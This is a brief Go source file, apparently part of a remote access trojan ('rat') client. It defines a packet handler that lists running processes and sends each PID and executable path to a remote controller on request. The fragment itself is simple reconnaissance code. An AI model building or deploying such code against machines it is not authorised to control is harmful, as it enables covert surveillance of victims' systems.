package main

import (
	"rat/client/process"
	"rat/common"
)

type ProcessPacket struct {
}

func (packet ProcessPacket) GetHeader() common.PacketHeader {
	return common.ProcessHeader
}

func (packet ProcessPacket) Write(c *Connection) error {
	process.QueryProcesses()

	c.WriteInt(len(process.Processes))

	for _, proc := range process.Processes {
		c.WriteInt(proc.PID)
		c.WriteString(proc.Path)
	}

	return nil
}

func (packet ProcessPacket) Read(c *Connection) error {
	Queue <- ProcessPacket{}
	return nil
}
